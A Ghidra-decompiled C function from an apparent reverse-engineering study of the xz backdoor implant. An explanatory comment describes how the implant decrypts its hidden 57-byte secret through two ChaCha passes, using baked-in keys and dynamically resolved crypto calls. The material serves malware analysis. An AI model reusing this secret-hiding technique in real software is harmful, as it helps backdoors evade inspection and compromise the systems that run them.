// /home/kali/xzre-ghidra/xzregh/1081D0_secret_data_get_decrypted.c
// Function: secret_data_get_decrypted @ 0x1081D0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall secret_data_get_decrypted(u8 * output, global_context_t * ctx)


/*
 * AutoDoc: Unwraps the 57-byte global_ctx->secret_data blob with two ChaCha passes. A baked-in key/IV pair (the key_buf constants) decrypts
 * a 0x30-byte seed, that seed becomes the real ChaCha key, and a second decrypt peels the runtime secret into the caller buffer
 * using another static IV. All operations go through the resolved EVP entry points so no static crypto ships with the implant.
 */

#include "xzre_types.h"

BOOL secret_data_get_decrypted(u8 *output,global_context_t *ctx)

{
  imported_funcs_t *funcs;
  BOOL success;
  long clear_idx;
  u8 *seed_cursor;
  u8 *buf_zero_cursor;
  key_buf buf2;
  key_buf buf1;
  u8 seed_iv[0x10];
  u8 seed_block[0x70];
  u8 payload_iv[0x10];
  
  if (output == (u8 *)0x0) {
    return FALSE;
  }
  if ((ctx != (global_context_t *)0x0) &&
     (funcs = ctx->imported_funcs, funcs != (imported_funcs_t *)0x0)) {
    seed_cursor = buf1.words + 0x14;
    for (clear_idx = 0xc; clear_idx != 0; clear_idx = clear_idx + -1) {
      *seed_cursor = 0;
      seed_cursor = seed_cursor + 1;
    }
    buf_zero_cursor = seed_block;
    for (clear_idx = 0x1c; clear_idx != 0; clear_idx = clear_idx + -1) {
      buf_zero_cursor[0] = '\0';
      buf_zero_cursor[1] = '\0';
      buf_zero_cursor[2] = '\0';
      buf_zero_cursor[3] = '\0';
      buf_zero_cursor = buf_zero_cursor + 4;
    }
    buf1.words[0x12] = 0x108233;
    buf1.words[0x13] = 0;
    success = chacha_decrypt((u8 *)(buf1.words + 0x14),0x30,(u8 *)(buf1.words + 0x14),seed_iv,
                           seed_block,funcs);
    if (success != FALSE) {
      buf1.words[0x12] = 0x108257;
      buf1.words[0x13] = 0;
      success = chacha_decrypt(ctx->secret_data,0x39,seed_block,payload_iv,output,ctx->imported_funcs);
      return (uint)(success != FALSE);
    }
  }
  return FALSE;
}

